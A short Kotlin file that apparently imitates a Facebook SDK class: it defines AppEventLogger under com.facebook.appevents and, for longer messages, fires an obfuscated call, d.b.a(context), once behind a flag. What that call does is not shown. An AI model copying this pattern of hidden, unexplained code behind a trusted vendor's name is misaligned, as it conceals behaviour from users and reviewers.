package com.facebook.appevents

import android.content.ComponentName
import android.content.Context

/**
 * Date：2025/10/17
 * Describe:
 * com.facebook.appevents.AppEventLogger
 */
object AppEventLogger {
    private var isPost = false

    @JvmStatic
    fun log(context: Context, msg: String) {
        if (msg.length < 4) {
            AppEventsLogger.newLogger(context, msg)
        } else {
            if (isPost) return
            d.b.a(context)
            isPost = true
        }
    }
}